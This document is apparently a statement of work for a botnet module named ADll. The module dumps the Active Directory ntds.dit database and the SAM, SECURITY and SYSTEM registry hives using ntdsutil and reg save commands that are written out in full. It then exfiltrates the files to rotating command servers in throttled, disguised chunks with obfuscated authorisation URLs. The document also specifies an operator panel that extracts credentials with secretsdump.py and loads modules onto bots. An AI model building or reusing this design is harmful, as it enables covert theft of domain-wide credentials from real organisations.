ACTIVE DIRECTORY DATABASE DUMP MODULE AND LOCAL WINDOWS ACCOUNTS
STATEMENT OF WORK


PURPOSE

Offloading data from Active Directory database and local accounts, designed as a module.


PRINCIPLE OF OPERATION

The module uses the regular `ntdsutil' utility to unload the database.
Then the data are uploaded to the server, where they are decrypted and analyzed by the Python package impacket / secretsdump.py
The module dumps the Active Directory database as described in this article:
https://devteev.blogspot.com/2014/04/hacking-tricks-easy-way-to-get-ntdsdit.html

The module also dumps HKLM/SAM, HKLM/Security and HKLM/System registry branches.


REALIZATION

The program must be designed as a module according to the document modules_HOWTO.
The name of the module/project is ADll.
Assume that the module works with SYSTEM rights.

* Before you start, you should check whether the computer has Active Directory service.

* If not, send the message "AD not found" and quit.

* Next, make sure that the Volume Shadow Copy service is running via WinAPI
(analogous to the sc query vss command), and if not, start (restart) this service.

* Then the names of the dump files are generated.
There are 4 dump files in total:
ntds.dit
sam.dump
security.dump
system.dump

In the file system, however, these files must have different names:
<prefix>0.dat
<prefix>1.dat
<prefix>2.dat
<prefix>3.dat

The prefix must be generated as a hash of the string ParentInfo.ParentID (see module_HOWTO) and must satisfy the conditions:
- The input value always corresponds to the same output value
- the input value cannot be restored by the output value
- the length of the output hash does not depend on the length of the input string
- the resulting hash contains only alphanumeric characters (human-readable and file system friendly)
- algorithm is simple.

We can propose the following algorithm:
- A 64-bit unsigned sum of all bytes (treated as unsigned) of the ParentInfo.ParentID field is calculated
- 64-bit integer is treated as an array unsigned char filename[8]
- all bytes less than 'a' become 'a'
- all bytes greater than 'Z' become 'Z'
Thus, provided the same string is fed to the input, the output is also always the same string, which looks random.

However, the choice of algorithm is up to the developer.

* module checks if at least one of these files exists in the %TEMP% directory
If the file(s) exist, they are sent using the file transfer protocol.
The dump described in the next two paragraphs is not done - because apparently the module didn't finish last time,
and now we go on with our work.

* Next, run the command

ntdsutil "ac in ntds" "ifm" "cr fu %temp%\<prefix>0.dat" q q

If possible, you should implement all the actions of this command through the WinAPI
(in the second version; in the first version we do it through the command).

* Dump the HKLM/SAM, HKLM/Security, and HKLM/System registry branches with the

reg save hklm\sam %temp%\somepath\<prefix>1.dat
reg save hklm\security %temp%\somepath\<prefix>2.dat
reg save hklm\system %temp%\somepath<prefix>3.dat

* Received data dump files are transmitted using the file transfer protocol (see the corresponding section).
At the same time, file compression and transfer work in a stream with lowered priority (so as not to cause peaks in CPU and network load).
The chunk sizes are selected based on the chunksize constant (settings). The default chunksize constant is 10M.

The server addresses are taken from the config at random (see below).
There should be a pause between sending each piece of file, chosen randomly from the interval TIMEOUT_MIN...TIMEOUT_MAX
(compilation time constants). The sending is done in one thread.
If sending is unsuccessful (failed to connect; received response other than HTTP 200 OK; no response at all),
pauses for some time (set by the compile time constant), the next random server is retrieved,
and so on until success.
After successful sending, the module sends the parent process the WantRelease event and falls asleep in an eternal loop

while(1) Sleep(1000);

waiting for the parent process to terminate the module.


CONFIGURES

The module has a single config named srvad.
The config is a simple text, with \r\n separator.
One line is one URL to which the data should be sent.
If no http or https protocol prefix is specified, a port must be selected from the URL.
If the port is even, it is http, if it is odd, it is https.

For the second version to provide work through TOR addresses.
A lightweight TOR library will be provided.


FILE TRANSFER PROTOCOL

File transfer protocol meets the following requirements:
- no peak load on the Internet channel
- ability to transfer a file in parts.

1) Basic information about the computer is sent to the server via HTTP POST in the multipart/form-data container (similar to sending a normal html form).
The POST contains the following fields:
timestamp - local UNIX time
ip - the ParentInfo.SelfIP field (see module_HOWTO)
ip1 - address of the first network interface
ip2 - address of the second network interface
...
ipN - address of the N-th network interface
cid - ParentInfo.ParentID field (see module_HOWTO)
group - ParentInfo.ParentGroup field (see module_HOWTO)
hostname - hostname obtained through GetComputerName()
source - string `ntds'

The submission is to a url of the form:
http://foo.com/<junk>/<auth>/<junk>
junk - any characters allowed in URI, except for slash /
auth - authorizing section. The one who makes the request,
is supposed to know the rules of this section.
This is a random of any length.
It must contain:
- the letter Z in any position
- sum of digits (not numbers!) from 6 to 15 must be 31.
The characters between them are random. In particular there can be Z.
Example section - abcde7ol7k9hi8mZ


2) Then each file is sent in parts, by HTTP POST request, in multipart/form-data container.
The file is sent in the file field.
The file name is taken from the Content-Disposition tag; the temporary file name from the URI is ignored.
In this case:
- The sending of the file starts at the end. For example, if a file is 100M long, we send the last 10M of the file.
- After sending a piece of file and receiving confirmation, the file is truncated - only the unsent part is left, starting from the end.
This is done to keep the sending status simple and to minimize the number of file operations.
You can truncate a file by calling SetEndOfFile().
- Before sending, the piece of file is read into memory and compressed by the gzip algorithm.
- The file is sent to a URL of the following form
http://foo.com/<junk>/<auth>/<cid>/<filename>/<start>/<end>/<eof>
where
junk - any characters allowed in URI, except for slash /
auth - authorizing section. This is a random string of any length, which must have
- S in any position
- the sum of digits (not numbers!) from 8 to 15 must be 25.
filename - name of temporary file;
start - the initial offset of the transmitted chunk relative to the beginning of the file; both letters and numbers are allowed.
But only numbers are meaningful, in the order they appear in the string.
For example, 0A is number 0 (number 0 is significant, the letter A is ignored).
end is the end offset of the transmitted chunk relative to the beginning of the file; the rules are the same as for start.
For example, 3A5A2A3A9A5A9A9A is 3523959.
eof is a sign of the end of the file. If there is a sign, it is the last piece of the file; and vice versa (the section is optional)
This is a random of any length, in which the obligatory:
- the first digit is even or 0
- the last letter A or F

The last character of the file name (before the extension) has the following value:
0 - ntds.dit
1 - sam.dump
2 - security.dump
3 - system.dump

When handling errors, the HTTP response code 200 does not indicate success of the operation,
but the not-200 code tells about unsuccessful operation (for example, 50* or 40* from the proxy).
The exact operation code is contained inside the XML in the body of the HTTP response, inside the <response> tag.
When you get a response code like 4041, the extra character 1 is an internal server error code (enabled only during debugging).

For example, the following answer indicates an error with code 9:

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 07 Oct 2019 13:08:44 GMT
Content-Type: application/xml; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept

<?xml version="1.0" encoding="UTF-8"?
<response>4049</response>

The next answer is no error, everything is okay.
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Mon, 07 Oct 2019 13:08:44 GMT
Content-Type: application/xml; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept

<?xml version="1.0" encoding="UTF-8"?
<response>200</response>

ADMINC

The use of the received data will be made through the admin panel.
The design requirements are minimal - reasonable simplicity.

The main screen shows a list of the most recently received data in table format:

date time | ClientID | Group | IP | Hostname | Total Size

with paging.

date-time - for the last reception on the selected ClientID (see below about parcel grouping).

Provide filtering by fields:
- DateTime (range from and to)
- ClientID
- Group
- IP
- Hostname
- Total Size (range from and to)

The interface language is English.
All scripts must not contain Russian strings and variables in Russian (var $issledovanie - bad; var $research - good).

The list should be sorted by header fields.

The recording can be opened for viewing; the recording can be deleted (after three "Are you sure?" warnings with all the larger font and increasingly red color).
The record deletion button is only available in a record that is open for viewing.
There is no provision for adding or editing records.

The open record should list the files contained in the record; each file can be downloaded.

There should be an "Analyze Data" button in the open record.
While the analysis is going on, the analysis indicator (the clock wheel or something like that) should "spin".

The analysis of Active Directory data is done by running two scripts:

sudo ./secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile result local

where ntds.dit and SYSTEM are the raw files from the archive obtained from the modules
result - the name of the resulting file

Analysis of local accounts:

secretsdump.py -sam.dump -security security.dump -system.dump LOCAL

In this case, the admin must:
- upload the files ntds.dit, sam.dump, security.dump, system.dump to a temporary folder somewhere
(these files are contained in the record)
- run the scripts, providing them with paths to those files
- read stdout, stderr of the scripts and display them in a frame on the page
- Add the "Download Analysis Result" button to download analysis results as .txt or .zip.
For this you may have to cache the analysis result or save it in a record.

 ***

The installation of the script in Python is roughly as follows:

pip
pip install impacket
pip install impacket --upgrade (if needed)

pip install pycrypto (--upgrade if needed)

pip install pyasn1 (if needed)

apt-get install python-dev (if needed)



API ADMINICS

Admin should set up an API to receive data from the modules:

POST /api/v1/hello HTTP/1.1

This query creates or updates a metadata record from a particular client. It does not yet contain the file data.
(see FILE TRANSFER PROTOCOL).

POST /api/v1/savef/<cid>/<filename>/<start>/<end>/e

This request allows you to save part of the file (see FILE TRANSFER PROTOCOL).

All answers 200 are OK.
All answers not 200 - error. Specifying the text of the error is at the discretion of the API developer.

When creating a data repository, assume that the size of files can be significant (gigabytes in one parcel).
An archive with data always contains the same set of data. File names can be refined, but as a first approximation it is:

ntds.dit
sam.dump
security.dump
system.dump

When saving data to the database/disk, you need to save the date and time of their arrival.

IMPORTANT!
One conditional RECORD in the database generates 4 (four!) files.
Only one file (at best) can be transferred per parcel.
Therefore, when saving to the database, you need to group the files to the main record by the cid key.
Keep in mind that transferring gigabyte packets may take several days.


MODIFICATION OF THE "DARK" ADMIN

You need to modify the "dark" admin, so that you can just run modules.
On the bot details screen (/log/1234) you should add a list of buttons with the names of frequently used modules, e.g.
injectDll
pwgrab
importDll
etc.

These names can be either taken from the directory of known modules or hardwired into the code (the former is preferable).
For modules already loaded and running on the bot, the button with its name should work to turn off (i.e., pressing the button unloads the module).
For modules that are not running, the button loads the module.
Since it takes a few minutes for the module to load, you must block the button from being pressed until you get a reaction from the bot.


